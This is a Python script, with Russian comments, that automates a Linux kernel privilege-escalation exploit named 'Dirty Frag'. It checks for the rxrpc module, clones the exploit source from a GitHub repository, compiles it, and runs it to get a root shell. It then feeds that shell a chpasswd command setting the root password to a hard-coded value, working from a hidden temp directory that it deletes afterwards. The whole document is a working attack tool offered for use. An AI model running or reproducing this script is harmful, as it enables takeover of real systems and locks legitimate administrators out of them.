#!/usr/bin/env python3
# dirtyfrag_root.py - Automatically changes root password to 'noddened'

import subprocess
import os
import sys
import tempfile
import shutil
from pathlib import Path

NEW_PASSWORD = "noddened"
WORK_DIR = tempfile.mkdtemp(prefix=".x_")

def cleanup():
    shutil.rmtree(WORK_DIR, ignore_errors=True)

def main():
    # Если уже root
    if os.geteuid() == 0:
        subprocess.run(["chpasswd"], input=f"root:{NEW_PASSWORD}", text=True)
        print(f"[+] Password changed to: {NEW_PASSWORD}")
        return
    
    print("[*] Starting Dirty Frag exploit...")
    
    # Проверка модуля rxrpc
    result = subprocess.run(["lsmod"], capture_output=True, text=True)
    if "rxrpc" not in result.stdout:
        print("[-] rxrpc module not loaded")
        return
    
    # Клонирование репозитория
    os.chdir(WORK_DIR)
    subprocess.run(["git", "clone", "--depth", "1", "https://github.com/V4bel/dirtyfrag.git"], 
                   capture_output=True)
    
    # Компиляция
    os.chdir("dirtyfrag")
    subprocess.run(["gcc", "-O0", "-Wall", "-o", "exp", "exp.c", "-lutil"], 
                   capture_output=True)
    
    if not Path("exp").exists():
        print("[-] Compilation failed")
        return
    
    # Запуск эксплойта и перехват root сессии
    try:
        # Запускаем эксплойт и ждем root shell
        proc = subprocess.Popen(["./exp"], 
                                stdin=subprocess.PIPE, 
                                stdout=subprocess.PIPE, 
                                stderr=subprocess.PIPE,
                                text=True)
        
        # Отправляем команду смены пароля в root shell
        proc.stdin.write(f"echo 'root:{NEW_PASSWORD}' | chpasswd && echo 'PASSWORD_CHANGED'\n")
        proc.stdin.write("exit\n")
        proc.stdin.flush()
        
        # Ждем вывод
        output, _ = proc.communicate(timeout=10)
        
        if "PASSWORD_CHANGED" in output:
            print(f"[+] Password changed to: {NEW_PASSWORD}")
        else:
            print("[-] Password change may have failed")
            
    except subprocess.TimeoutExpired:
        proc.kill()
        print("[-] Exploit timeout")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        cleanup()

if __name__ == "__main__":
    main()
